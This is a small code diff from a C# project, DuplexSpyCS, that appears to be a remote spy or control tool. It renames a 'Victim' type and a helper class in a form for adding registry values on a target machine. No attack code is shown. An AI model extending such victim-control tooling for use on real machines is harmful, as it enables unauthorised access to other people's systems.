@@ -14,7 +14,7 @@ namespace DuplexSpyCS
     public partial class frmRegValAdd : Form
     {
         public frmManager f_mgr;
-        public Victim v;
+        public clsVictim v;
 
         public string currentPath;
 
@@ -26,7 +26,7 @@ namespace DuplexSpyCS
         void setup()
         {
             comboBox1.SelectedIndex = 0;
-            textBox1.Text = C1.GenerateFileName();
+            textBox1.Text = clsTools.GenerateFileName();
         }
 
         private void frmRegValAdd_Load(object sender, EventArgs e)
